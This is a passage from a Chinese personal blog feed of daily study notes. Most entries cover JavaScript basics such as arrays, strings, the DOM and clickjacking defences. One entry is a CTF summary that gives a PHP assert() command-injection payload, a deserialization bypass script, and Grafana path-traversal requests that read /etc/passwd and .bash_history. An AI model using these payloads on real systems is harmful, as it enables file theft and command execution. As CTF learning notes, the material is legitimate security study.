语法用于将数组传递给通常需要含有许多参数的函数。<br>我们可以使用这两种语法轻松地互相转换列表与参数数组。<br>旧式的 arguments（类数组且可迭代的对象）也依然能够帮助我们获取函数调用中的所有参数。</p><h4 id="垃圾收集"><a href="#垃圾收集" class="headerlink" title="垃圾收集"></a>垃圾收集</h4><p>通常，函数调用完成后，会将词法环境和其中的所有变量从内存中删除。因为现在没有任何对它们的引用了。与 JavaScript 中的任何其他对象一样，词法环境仅在可达时才会被保留在内存中。<br>但是，如果有一个嵌套的函数在函数结束后仍可达，则它将具有引用词法环境的[[Environment]] 属性。<br>如果在（外部）函数执行完成后，它的词法环境仍然可达。因此，此词法环境仍然有效。<br>若要删除则需要令词法环境对象变得不可达</p><h4 id="属性标志"><a href="#属性标志" class="headerlink" title="属性标志"></a>属性标志</h4><p>value<br>writable — 如果为 true，则值可以被修改，否则它是只可读的。<br>enumerable — 如果为 true，则会被在循环中列出，否则不会被列出。<br>configurable — 如果为 true，则此属性可以被删除，这些特性也可以被修改，否则不可以。</p><h4 id="浏览器环境，规格"><a href="#浏览器环境，规格" class="headerlink" title="浏览器环境，规格"></a>浏览器环境，规格</h4><p>能运行 JavaScript 的平台称为主机环境<br>包含DOM，BOM，JavaScript</p><pre><code>文档对象模型（DOM）将所有页面内容表示为可以修改的对象浏览器对象模型（BOM）表示由浏览器（主机环境）提供的用于处理文档（document）之外的所有内容的其他对象  例如:      navigator 对象提供了有关浏览器和操作系统的背景信息          navigator.userAgent —— 关于当前浏览器          navigator.platform —— 关于平台（有助于区分 Windows/Linux/Mac 等）      location 对象允许我们读取当前 URL，并且可以将浏览器重定向到新的 URL</code></pre><h4 id="DOM-树"><a href="#DOM-树" class="headerlink" title="DOM 树"></a>DOM 树</h4><p>概念:<br>DOM 将 HTML 表示为标签的树形结构。<br>每个树的节点都是一个对象。<br>标签被称为 元素节点（或者仅仅是元素），元素内的文本形成 文本节点，被标记为 ＃text。一个文本节点只包含一个字符串。它没有子项，并且总是树的叶子。</p><p>自动修正:<br>浏览器遇到格式不正确的 HTML，它会在形成 DOM 时自动更正它。</p><p>浏览器开发工具元素（Elements）选项卡:<br>Styles —— 我们可以看到按规则应用于当前元素的 CSS 规则，包括内建规则（灰色）。几乎所有内容都可以就地编辑，包括下面的方框的 dimension/margin/padding。<br>Computed —— 按属性查看应用于元素的 CSS：对于每个属性，我们可以都可以看到赋予它的规则（包括 CSS 继承等）。<br>Event Listeners —— 查看附加到 DOM 元素的事件侦听器（我们将在本教程的下一部分介绍它们）。</p><p>节点属性:</p><pre><code>每个 DOM 节点都属于一个特定的类。这些类形成层次结构（hierarchy）。完整的属性和方法集是继承的结果。主要的 DOM 节点属性有：nodeType    我们可以使用它来查看节点是文本节点还是元素节点。它具有一个数值型值（numeric value）：1 表示元素，3 表示文本节点，其他一些则代表其他节点类型。只读。nodeName/tagName    用于元素名，标签名（除了 XML 模式，都要大写）。对于非元素节点，nodeName 描述了它是什么。只读。innerHTML    元素的 HTML 内容。可以被修改。outerHTML    元素的完整 HTML。对 elem.outerHTML 的写入操作不会触及 elem 本身。而是在外部上下文中将其替换为新的 HTML。nodeValue/data    非元素节点（文本、注释）的内容。两者几乎一样，我们通常使用 data。可以被修改。textContent    元素内的文本：HTML 减去所有 &lt;tags&gt;。写入文本会将文本放入元素内，所有特殊字符和标签均被视为文本。可以安全地插入用户生成的文本，并防止不必要的 HTML 插入。hidden    当被设置为 true 时，执行与 CSS display:none 相同的事。DOM 节点还具有其他属性，具体有哪些属性则取决于它们的类。例如，&lt;input&gt; 元素（HTMLInputElement）支持 value，type，而 &lt;a&gt; 元素（HTMLAnchorElement）则支持 href 等。大多数标准 HTML 特性（attribute）都具有相应的 DOM 属性。</code></pre><h4 id="弹窗和-window-的方法"><a href="#弹窗和-window-的方法" class="headerlink" title="弹窗和 window 的方法"></a>弹窗和 window 的方法</h4><p>window.open(‘<a href="https://javascript.info/&#39;)%E6%89%93%E5%BC%80%E4%B8%80%E4%B8%AA%E5%85%B7%E6%9C%89%E7%BB%99%E5%AE%9A">https://javascript.info/&#39;)打开一个具有给定</a> URL 的新窗口</p><pre><code>阻止弹窗:1.阻止除了用户触发的事件之外的弹窗// 弹窗被阻止window.open(&#39;https://javascript.info&#39;);// 弹窗被允许button.onclick = () =&gt; &#123;  window.open(&#39;https://javascript.info&#39;);&#125;;2.浏览器可以接受不同时间的延迟，超过这个时间则移除“信任”// 1 秒后打开弹窗setTimeout(() =&gt; window.open(&#39;http://google.com&#39;), 1000);</code></pre><h4 id="window-open"><a href="#window-open" class="headerlink" title="window.open"></a>window.open</h4><p>打开一个弹窗的语法是 window.open(url, name, params)<br>其中params是width=200,height=100<br>窗口功能<br>menubar（yes/no）—— 显示或隐藏新窗口的浏览器菜单。<br>toolbar（yes/no）—— 显示或隐藏新窗口的浏览器导航栏（后退，前进，重新加载等）。<br>location（yes/no）—— 显示或隐藏新窗口的 URL 字段。Firefox 和 IE 浏览器不允许默认隐藏它。<br>status（yes/no）—— 显示或隐藏状态栏。同样，大多数浏览器都强制显示它。<br>resizable（yes/no）—— 允许禁用新窗口大小调整。不建议使用。<br>scrollbars（yes/no）—— 允许禁用新窗口的滚动条。不建议使用。</p><h4 id="跨窗口通信"><a href="#跨窗口通信" class="headerlink" title="跨窗口通信"></a>跨窗口通信</h4><p>“同源（Same Origin）”策略(保护用户免遭信息盗窃)限制了窗口（window）和 frame 之间的相互访问。<br>如果两个 URL 具有相同的协议，域和端口，则称它们是“同源”的。<br>“同源”策略规定：<br>1.如果我们有对另外一个窗口的引用，并且该窗口是同源的，那么我们就具有对该窗口的全部访问权限。<br>2.否则，就无法访问该窗口中的任何东西。唯一的例外是 location：我们可以修改它（进而重定向用户）。但是我们无法读取 location（因此，我们无法看到用户当前所处的位置，也就不会泄漏任何信息）。</p><h4 id="点击劫持攻击"><a href="#点击劫持攻击" class="headerlink" title="点击劫持攻击"></a>点击劫持攻击</h4><p>原理:<br>1.访问者被恶意页面吸引<br>2.页面上有一个看起来无害的链接<br>3.放置了一个透明的iframe标签，通常通过 z-index 实现的<br>点击劫持是对点击事件，而非键盘事件<br>防御:<br>1.阻止因更改 beforeunload 事件处理程序中的 top.location 而引起的过渡————当 iframe 试图更改 top.location 时，访问者会收到一条消息，询问他们是否要离开页面<br>2.利用Sandbox 特性，添加sandbox=”allow-scripts allow-forms” 的 iframe。允许脚本和表单。但没有 allow-top-navigation，因此禁止更改 top.location 。<br>3.服务器端 header X-Frame-Options 可以允许或禁止在 frame 中显示页面。(副作用大)<br>4.具有 samesite 特性的 cookie 仅在网站是通过直接方式打开（而不是通过 frame 或其他方式）的情况下才发送到网站。</p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><h5 id="落月随山隐，"><a href="#落月随山隐，" class="headerlink" title="落月随山隐，"></a>落月随山隐，</h5><h5 id="山随月落隐。"><a href="#山随月落隐。" class="headerlink" title="山随月落隐。"></a>山随月落隐。</h5><h5 id="月落山随隐，"><a href="#月落山随隐，" class="headerlink" title="月落山随隐，"></a>月落山随隐，</h5><h5 id="随月落山隐。"><a href="#随月落山隐。" class="headerlink" title="随月落山隐。"></a>随月落山隐。</h5>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;每日一记&quot;&gt;&lt;a href=&quot;#每日一记&quot; class=&quot;headerlink&quot; title=&quot;每日一记&quot;&gt;&lt;/a&gt;每日一记&lt;/h3&gt;&lt;h4 id=&quot;递归&quot;&gt;&lt;a href=&quot;#递归&quot; class=&quot;headerlink&quot; title=&quot;递归&quot;&gt;&lt;/a&gt;递归&lt;/h</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>20221108</title>
    <link href="https://liu1272.github.io/2022/11/08/20221108/"/>
    <id>https://liu1272.github.io/2022/11/08/20221108/</id>
    <published>2022-11-08T10:38:00.000Z</published>
    <updated>2022-11-08T17:32:42.644Z</updated>
    
    <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><p>数组（Array）能存储有序的集合</p><p>声明:</p><pre><code>let arr = new Array();let fruits = [&quot;Apple&quot;, &quot;Orange&quot;, &quot;Plum&quot;];重新定义就能更改value增加array只需要定义新位置fruits.length是元素的个数以逗号结尾</code></pre><p>查找:<br>fruits[fruits.length - 1]&lt;因为方括号中的索引是被按照其字面意思处理的&gt;<br>fruits.at(-1)<br>不能用fruits[-1]查找元素,结果是 undefined</p><p>更改:<br>push 在末端添加一个元素<br>pop 从末端取出并删除一个元素<br>unshift 在数组的首端添加元素<br>shift 取出队列首端的一个元素，整个队列往前移，这样原先排第二的元素现在排在了第一个<br>(push 和 unshift 方法都可以一次添加多个元素)<br>push/pop 方法运行的比较快，而 shift/unshift 比较慢</p><p>slice:<br>arr.slice([start], [end])<br>返回一个新数组，将所有从索引 start 到 end（不包括 end）的数组项复制到一个新的数组。start 和 end 都可以是负数，在这种情况下，从末尾计算索引</p><p>splice:<br>arr.splice(start[, deleteCount, elem1, …, elemN])<br>从索引 start 开始修改 arr：删除 deleteCount 个元素并在当前位置插入 elem1, …, elemN。最后返回被删除的元素所组成的数组</p><p>concat:<br>arr.concat(arg1, arg2…)<br>创建一个包含来自于 arr，然后是 arg1，arg2 的元素的新数组。<br>如果参数 argN 是一个数组，那么其中的所有元素都会被复制。否则，将复制参数本身。<br>如果类数组对象具有 Symbol.isConcatSpreadable 属性，那么它的元素就会被添加</p><p>遍历:<br>for..of 不能获取当前元素的索引，只是获取元素值<br>for..in 会遍历所有属性，不仅仅是数字属性，而且不适用于数组，因此速度要慢<br>forEach 允许为数组的每个元素都运行一个函数</p><p>关于 “length”:<br>不是数组里元素的个数，而是最大的数字索引值加一<br>通过减少length来截断数组，但length恢复后数组不会恢复<br>清空数组最简单的方法就是：arr.length = 0;</p><p>new Array():<br>创建一个指定了长度，却没有任何项的数组</p><p>多维数组:<br>matrix[1][1]最中间的那个数</p><p>toString:<br>返回以逗号隔开的元素列表</p><p>使用 == 比较数组:<br>1.仅当两个对象引用的是同一个对象时，它们才相等 ==<br>2.如果 == 左右两个参数之中有一个参数是对象，另一个参数是原始类型，那么该对象将会被转换为原始类型<br>3.……null 和 undefined 相等 ==，且各自不等于任何其他的值</p><p>在数组中搜索:<br>arr.indexOf(item, from);<br>从索引 from 开始搜索 item，如果找到则返回索引，否则返回 -1。<br>arr.includes(item, from);<br>从索引 from 开始搜索 item，如果找到则返回 true（没找到则返回 false）。<br>alert( fruits.lastIndexOf(‘Apple’) );<br>与 indexOf 相同，但从右向左查找<br>arr.find(function(item, index, array);<br>item 是元素。index 是它的索引。array 是数组本身。<br>如果返回 true，则返回 item 并停止迭代;对于假值，则返回 undefined<br>arr.filter(function(item, index, array);<br>如果 true item 被 push 到 results，迭代继续;如果什么都没找到，则返回空数组<br>indexOf 和 includes 使用严格相等 === 进行比较。所以，搜索 false时会准确找到 false 而不是数字 0<br>includes可以正确处理 NaN</p><p>转换数组:<br>arr.map(function(item, index, array)<br>对数组的每个元素都调用函数，并返回结果数组<br>arr.sort();<br>默认情况下被按字符串进行排序<br>arr.sort(compareNumeric);<br>按数字进行排序<br>arr.reverse();<br>倒序</p><p>分割粘合数组:<br>let arr = names.split(‘, ‘,2);<br>将字符串分割成一个个数组,限制数组长度为2,额外的元素会被忽略<br>str.split(‘’);<br>将字符串拆分为字母数组<br>arr.join(‘;’);<br>根据;粘合数组</p><p>从数组中区分出普通对象:<br>Array.isArray({})<br>如果 value 是一个数组，则返回 true；否则返回 false。</p><h4 id="Iterable-object（可迭代对象）"><a href="#Iterable-object（可迭代对象）" class="headerlink" title="Iterable object（可迭代对象）"></a>Iterable object（可迭代对象）</h4><p>可以应用 for..of 的对象被称为 可迭代的。<br>技术上来说，可迭代对象必须实现 Symbol.iterator 方法。<br>obj[Symbol.iterator].() 的结果被称为迭代器（iterator）。由它处理进一步的迭代过程。<br>一个迭代器必须有 next() 方法，它返回一个 {done: Boolean, value: any} 对象，这里 done:true 表明迭代结束，否则 value 就是下一个值。<br>Symbol.iterator 方法会被 for..of 自动调用，但我们也可以直接调用它。<br>内建的可迭代对象例如字符串和数组，都实现了 Symbol.iterator。<br>字符串迭代器能够识别代理对。<br>有索引属性和 length 属性的对象被称为 类数组对象。这种对象可能还具有其他属性和方法，但是没有数组的内建方法。<br>如果我们仔细研究一下规范 —— 就会发现大多数内建方法都假设它们需要处理的是可迭代对象或者类数组对象，而不是“真正的”数组，因为这样抽象度更高。<br>Array.from(obj[, mapFn, thisArg]) 将可迭代对象或类数组对象 obj 转化为真正的数组 Array，然后我们就可以对它应用数组的方法。可选参数 mapFn 和 thisArg 允许我们将函数应用到每个元素。</p><h4 id="Map-and-Set（映射和集合）"><a href="#Map-and-Set（映射和集合）" class="headerlink" title="Map and Set（映射和集合）"></a>Map and Set（映射和集合）</h4><p>Map 是一个带键的数据项的集合，就像一个 Object 一样。 但是它们最大的差别是 Map 允许任何类型的键（key）。</p><pre><code>Mapnew Map() —— 创建 map。map.set(key, value) —— 根据键存储值。map.get(key) —— 根据键来返回值，如果 map 中不存在对应的 key，则返回 undefined。map.has(key) —— 如果 key 存在则返回 true，否则返回 false。map.delete(key) —— 删除指定键的值。map.clear() —— 清空 map。map.size —— 返回当前元素个数。Map 迭代map.keys() —— 遍历并返回一个包含所有键的可迭代对象，map.values() —— 遍历并返回一个包含所有值的可迭代对象，map.entries() —— 遍历并返回一个包含所有实体 [key, value] 的可迭代对象，for..of 在默认情况下使用的就是这个。</code></pre><p>Object.entries：从对象创建 Map<br>let map = new Map(Object.entries(obj));<br>Object.fromEntries：从 Map 创建对象<br>let obj = Object.fromEntries(map.entries()); // 创建一个普通对象（plain object）(*)</p><pre><code>Setnew Set(iterable) —— 创建一个 set，如果提供了一个 iterable 对象（通常是数组），将会从数组里面复制值到 set 中。set.add(value) —— 添加一个值，返回 set 本身set.delete(value) —— 删除值，如果 value 在这个方法调用的时候存在则返回 true ，否则返回 false。set.has(value) —— 如果 value 在 set 中，返回 true，否则返回 false。set.clear() —— 清空 set。set.size —— 返回元素个数。Set 迭代（iteration）set.keys() —— 遍历并返回一个包含所有值的可迭代对象，set.values() —— 与 set.keys() 作用相同，这是为了兼容 Map，set.entries() —— 遍历并返回一个包含所有的实体 [value, value] 的可迭代对象，它的存在也是为了兼容 Map。</code></pre><h4 id="WeakMap"><a href="#WeakMap" class="headerlink" title="WeakMap"></a>WeakMap</h4><p>WeakMap 是类似于 Map 的集合，它仅允许对象作为键，并且一旦通过其他方式无法访问这些对象，垃圾回收便会将这些对象与其关联值一同删除。</p><p>WeakSet 是类似于 Set 的集合，它仅存储对象，并且一旦通过其他方式无法访问这些对象，垃圾回收便会将这些对象删除。</p><p>它们的主要优点是它们对对象是弱引用，所以被它们引用的对象很容易地被垃圾收集器移除。</p><p>这是以不支持 clear、size、keys、values 等作为代价换来的……</p><p>WeakMap 和 WeakSet 被用作“主要”对象存储之外的“辅助”数据结构。一旦将对象从主存储器中删除，如果该对象仅被用作 WeakMap 或 WeakSet 的键，那么该对象将被自动清除。</p><h4 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h4><p>JSON 是一种数据格式，具有自己的独立标准和大多数编程语言的库。<br>JSON 支持 object，array，string，number，boolean 和 null。<br>JavaScript 提供序列化（serialize）成 JSON 的方法 JSON.stringify 和解析 JSON 的方法 JSON.parse。<br>这两种方法都支持用于智能读/写的转换函数。<br>如果一个对象具有 toJSON，那么它会被 JSON.stringify 调用。</p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><h5 id="今天就想说一句-我这是学js上头了嘛，为啥学这么细……"><a href="#今天就想说一句-我这是学js上头了嘛，为啥学这么细……" class="headerlink" title="今天就想说一句:我这是学js上头了嘛，为啥学这么细……"></a>今天就想说一句:我这是学js上头了嘛，为啥学这么细……</h5>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;每日一记&quot;&gt;&lt;a href=&quot;#每日一记&quot; class=&quot;headerlink&quot; title=&quot;每日一记&quot;&gt;&lt;/a&gt;每日一记&lt;/h3&gt;&lt;h4 id=&quot;数组&quot;&gt;&lt;a href=&quot;#数组&quot; class=&quot;headerlink&quot; title=&quot;数组&quot;&gt;&lt;/a&gt;数组&lt;/h</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>20221107</title>
    <link href="https://liu1272.github.io/2022/11/07/20221107/"/>
    <id>https://liu1272.github.io/2022/11/07/20221107/</id>
    <published>2022-11-07T07:44:00.000Z</published>
    <updated>2022-11-08T09:17:59.476Z</updated>
    
    <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="原始类型的方法"><a href="#原始类型的方法" class="headerlink" title="原始类型的方法"></a>原始类型的方法</h4><h5 id="原始类型和对象之间的关键区别。"><a href="#原始类型和对象之间的关键区别。" class="headerlink" title="原始类型和对象之间的关键区别。"></a>原始类型和对象之间的关键区别。</h5><p>一个原始值：<br>是原始类型中的一种值。<br>在 JavaScript 中有 7 种原始类型：string，number，bigint，boolean，symbol，null 和 undefined。<br>一个对象：<br>能够存储多个值作为属性。<br>可以使用大括号 {} 创建对象，例如：{name: “John”, age: 30}。JavaScript 中还有其他种类的对象，例如函数就是对象。<br>原始类型不是对象，它们不能存储额外的数据。</p><h4 id="数字类型"><a href="#数字类型" class="headerlink" title="数字类型"></a>数字类型</h4><p>两种类型:<br>常规数字以 64 位的格式 IEEE-754 存储，也被称为“双精度浮点数”<br>BigInt 用于表示任意长度的整数</p><p>编写数字的方法:<br>let billion = 1e9;           // 10 亿，字面意思：数字 1 后面跟 9 个 0<br>alert( 7.3e9 );              // 73 亿（与 7300000000 和 7_300_000_000 相同）<br>let mcs = 0.000001 = 1e-6;   // 1 的左边有 6 个 0;</p><p>二进制0b  八进制0o  十六进制0x</p><p>toString(base):<br>返回在给定 base 进制数字系统中 num 的字符串表示形式<br>alert( 123456..toString(36) );     // 三十六进制，2n9c</p><p>使用两个点来调用一个方法:<br>123456.toString(36)相当于(123456).toString(36)<br>语法隐含了第一个点之后的部分为小数部分。再放一个点，JS就知道小数部分为空。</p><p>舍入:</p><pre><code>        Math.floor     Math.ceil     Math.round     Math.trunc3.1        3              4             3             33.6        3              4           4           3-1.1       -2             -1            -1            -1-1.6       -2             -1            -2            -1</code></pre><p>Math.floor向下舍入<br>Math.ceil向上舍入<br>Math.round向最近的整数舍入<br>Math.trunc（IE 浏览器不支持这个方法）移除小数点后的所有内容而没有舍入</p><p>舍入到小数点后 n 位:<br>1.将数字乘以 100，调用舍入函数，然后再将其除回<br>2.toFixed(n) 将数字四舍五入到小数点后 n 位，并以字符串形式返回结果</p><p>不精确的计算:<br>数字是以 64 位格式 IEEE-754 表示的:其中 52 位被用于存储这些数字， 11 位用于存储小数点的位置，而 1 位用于符号。<br>1.如果一个数字真的很大，则可能会溢出 64 位存储，变成一个特殊的数值 Infinity<br>2.一个数字以其二进制的形式存储在内存中。但是在十进制数字系统中看起来很简单的 0.1，0.2 这样的小数，实际上在二进制形式中是无限循环小数<br>最可靠的解决方法是借助方法 toFixed(n) 对结果进行舍入</p><p>isFinite 和 isNaN:<br>属于 number 类型，但不是“普通”数字<br>Infinity（和 -Infinity）是一个特殊的数值，比任何数值都大（小）。<br>NaN 代表一个 error。<br>isNaN(value) 将其参数转换为数字，然后测试它是否为 NaN<br>isFinite(value) 将其参数转换为数字，如果是常规数字而不是 NaN/Infinity/-Infinity，则返回 true<br>注:在所有数字函数中，包括 isFinite，空字符串或仅有空格的字符串均被视为 0<br>比较两个值是否完全相同时，它使用Object.is(a,b) === true</p><p>parseInt(str, radix) 和 parseFloat:<br>从字符串中“读取”数字，直到无法读取为止。parseInt 返回一个整数，parseFloat 返回一个浮点数,没有数字可读时为NaN<br>parseInt(str, radix) 的第二个参数为要解析的str的进制,可选</p><p>其他数学函数:<br>Math.random()返回一个从 0 到 1 的随机数（不包括 1）<br>Math.max(a, b, c…)返回最大值<br>Math.pow(n, power)返回 n 的power次幂</p><h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><p>文本数据被以字符串形式存储，单个字符没有单独的类型。<br>字符串的内部格式始终是 UTF-16，它不依赖于页面编码。<br>引号（Quotes）:<br>1.反引号允许我们通过 ${…} 将任何表达式嵌入到字符串中<br>2.允许字符串跨行</p><p>特殊字符:</p><pre><code>\n         换行\r         Windows 文本文件中，两个字符 \r\n 的组合代表一个换行。而在非 Windows 操作系统上，它就是 \n。\&#39;和\&quot;     引号\          转义字符\\         反斜线\t         制表符\b         退格\f         换页\v         垂直\xXX       十六进制 Unicode XX 的 Unicode 字符\u&#123;X…XXXXXX&#125;（1 到 6 个十六进制字符）     具有给定 UTF-32 编码的 Unicode 符号</code></pre><p>字符串长度:</p><pre><code>let str = `Hello`;// 第一个字符alert( str[0] ); // Halert( str.charAt(0) ); // H// 最后一个字符alert( str[str.length - 1] ); // o如果没有找到字符，[] 返回 undefined，而 charAt 返回一个空字符串</code></pre><p>字符串是不可变的:<br>要更改就要创建一个新的字符串，并将其分配给新字符串而不是以前的字符串</p><p>改变大小写:</p><pre><code>toLowerCase() 和 toUpperCase() 改变单个字符大小写alert( &#39;Interface&#39;[0].toLowerCase() ); // &#39;i&#39;</code></pre><p>查找子字符串:<br>str.indexOf(substr, pos)<br>从给定位置 pos 开始，在 str 中查找 substr，如果没有找到，则返回 -1，否则返回匹配成功的位置<br>如果我们对所有存在位置都感兴趣，可以在一个循环中使用 indexOf<br>str.lastIndexOf(substr, position)<br>从字符串的末尾开始搜索到开头,以相反的顺序列出这些事件</p><p>按位（bitwise）NOT :<br>将数字转换为 32-bit 整数（如果存在小数部分，则删除小数部分），然后对其二进制表示形式中的所有位均取反<br>对于 32-bit 整数，~n 等于 -(n+1)</p><p>includes，startsWith，endsWith:<br>includes检测匹配，但不需要它的位置,第二个可选参数是开始搜索的起始位置</p><pre><code>alert( &quot;Widget&quot;.startsWith(&quot;Wid&quot;) );        // true，&quot;Widget&quot; 以 &quot;Wid&quot; 开始alert( &quot;Widget&quot;.endsWith(&quot;get&quot;) );          // true，&quot;Widget&quot; 以 &quot;get&quot; 结束</code></pre><p>获取子字符串:</p><pre><code>str.slice(start,end)返回字符串从 start 到（但不包括）end 的部分start/end 也有可能是负值。它们的意思是起始位置从字符串结尾计算str.substring(start,end)返回字符串从 start 到（但不包括）end 的部分。这与 slice 几乎相同，但它允许 start 大于 endstr.substr(start,length)返回字符串从 start 开始的给定 length 的部分。与以前的方法相比，这个允许我们指定 length 而不是结束位置第一个参数可能是负数，从结尾算起</code></pre><p>比较字符串:<br>1.小写字母总是大于大写字母<br>2.带变音符号的字母存在“乱序”的情况(例如部分国家名字)<br>str.codePointAt(pos)返回在 pos 位置的字符代码<br>String.fromCodePoint(code)通过数字 code 创建字符<br>可以用 \u 后跟十六进制代码，通过这些代码添加 Unicode 字符</p><p><a href="https://zh.javascript.info/string#nei-bu-unicode">内部，Unicode</a></p><p>其他几种有用的字符串方法：<br>str.trim()删除字符串前后的空格 (“trims”)。<br>str.repeat(n)重复字符串 n 次。</p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><h5 id="我打江南走过"><a href="#我打江南走过" class="headerlink" title="我打江南走过"></a>我打江南走过</h5><h5 id="那等在季节里的容颜如莲花的开落"><a href="#那等在季节里的容颜如莲花的开落" class="headerlink" title="那等在季节里的容颜如莲花的开落"></a>那等在季节里的容颜如莲花的开落</h5><h5 id="东风不来，三月的柳絮不飞"><a href="#东风不来，三月的柳絮不飞" class="headerlink" title="东风不来，三月的柳絮不飞"></a>东风不来，三月的柳絮不飞</h5><h5 id="你底心如小小寂寞的城"><a href="#你底心如小小寂寞的城" class="headerlink" title="你底心如小小寂寞的城"></a>你底心如小小寂寞的城</h5><h5 id="恰若青石的街道向晚"><a href="#恰若青石的街道向晚" class="headerlink" title="恰若青石的街道向晚"></a>恰若青石的街道向晚</h5><h5 id="跫音不响，三月的春帷不揭"><a href="#跫音不响，三月的春帷不揭" class="headerlink" title="跫音不响，三月的春帷不揭"></a>跫音不响，三月的春帷不揭</h5><h5 id="你底心是小小的窗扉紧掩"><a href="#你底心是小小的窗扉紧掩" class="headerlink" title="你底心是小小的窗扉紧掩"></a>你底心是小小的窗扉紧掩</h5><h5 id="我达达的马蹄是美丽的错误"><a href="#我达达的马蹄是美丽的错误" class="headerlink" title="我达达的马蹄是美丽的错误"></a>我达达的马蹄是美丽的错误</h5><h5 id="我不是归人，是个过客"><a href="#我不是归人，是个过客" class="headerlink" title="我不是归人，是个过客"></a>我不是归人，是个过客</h5>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;每日一记&quot;&gt;&lt;a href=&quot;#每日一记&quot; class=&quot;headerlink&quot; title=&quot;每日一记&quot;&gt;&lt;/a&gt;每日一记&lt;/h3&gt;&lt;h4 id=&quot;原始类型的方法&quot;&gt;&lt;a href=&quot;#原始类型的方法&quot; class=&quot;headerlink&quot; title=&quot;原始类</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>20221106CTF总结</title>
    <link href="https://liu1272.github.io/2022/11/06/20221106CTF%E6%80%BB%E7%BB%93/"/>
    <id>https://liu1272.github.io/2022/11/06/20221106CTF%E6%80%BB%E7%BB%93/</id>
    <published>2022-11-06T13:57:22.000Z</published>
    <updated>2022-11-06T14:20:06.450Z</updated>
    
    <content type="html"><![CDATA[<h5 id="404页面"><a href="#404页面" class="headerlink" title="404页面:"></a>404页面:</h5><p>url+404/</p><h5 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行:"></a>命令执行:</h5><pre><code>&lt;?phperror_reporting(0);if(isset($_GET[&#39;c&#39;]))&#123;    $c = $_GET[&#39;c&#39;];    if($_GET[&#39;c&#39;] === &quot;flag&quot;)&#123;            如果 c=flag 的话，会看到 flag.php 文件        highlight_file(&quot;flag.php&quot;);    &#125;    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;       正则匹配过滤 flag 字符        $page = $_GET[&#39;c&#39;];    &#125;    assert(&quot;file_exists(&#39;$page&#39;)&quot;);           assert 函数&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;利用assert函数的特性，实现命令执行assert函数里面的参数为字符串时，会将字符串当做php命令来执行。assert(&#39;phpinfo()&#39;)=&lt;?php phpinfo()?&gt;构造闭合函数，使 assert 函数执行系统命令为还过滤了 flag 字符，使用?匹配符绕过Payload：?c=1&#39;) or system(&#39;ls?c=1&#39;) or system(&#39;cat fla?.txt</code></pre><h5 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h5><p>construct()：构造函数/方法，是类中的一种特殊函数,当使用 new 关键字实例化一个对象时,构造函数将会自动调用<br>wakeup( )函数是在 php 在使用反序列化函数 unserialize()时，会自动调用的函数，只要序列化的中的成员数大于实际成员数，即可绕过<br>destruct()函数是在对象被销毁时才会被调用，可以注意到flag.php文件，需password=666绕过第一个if，username等于usernames才能够输出flag文件；<br>参数需要进行 base64 加密<br>Payload：<br>&lt;?php<br>class Name{<br> private $username = ‘usernames’;<br> private $password = ‘666’;<br>}<br>$select = serialize(new Name());<br>$select = str_replace(‘:2:’,’:3:’,$select);<br>echo base64_encode($select);</p><h5 id="grafana漏洞"><a href="#grafana漏洞" class="headerlink" title="grafana漏洞"></a>grafana漏洞</h5><p>抓包根据漏洞的原理，构造 payload 路径，进行任意文件读取<br>/public/plugins/alertlist/../../../../../../../../../etc/pa<br>sswd<br>看到系统的配置文件，存在哪些用户<br>linux 的历史记录文件.bash_history<br>构造 payload:<br>/public/plugins/alertlist/../../../../../../../../../home/grafana/.bash_history</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;404页面&quot;&gt;&lt;a href=&quot;#404页面&quot; class=&quot;headerlink&quot; title=&quot;404页面:&quot;&gt;&lt;/a&gt;404页面:&lt;/h5&gt;&lt;p&gt;url+404/&lt;/p&gt;
&lt;h5 id=&quot;命令执行&quot;&gt;&lt;a href=&quot;#命令执行&quot; class=&quot;header</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>20221105</title>
    <link href="https://liu1272.github.io/2022/11/05/20221105/"/>
    <id>https://liu1272.github.io/2022/11/05/20221105/</id>
    <published>2022-11-05T05:18:00.000Z</published>
    <updated>2022-11-08T07:44:42.288Z</updated>
    
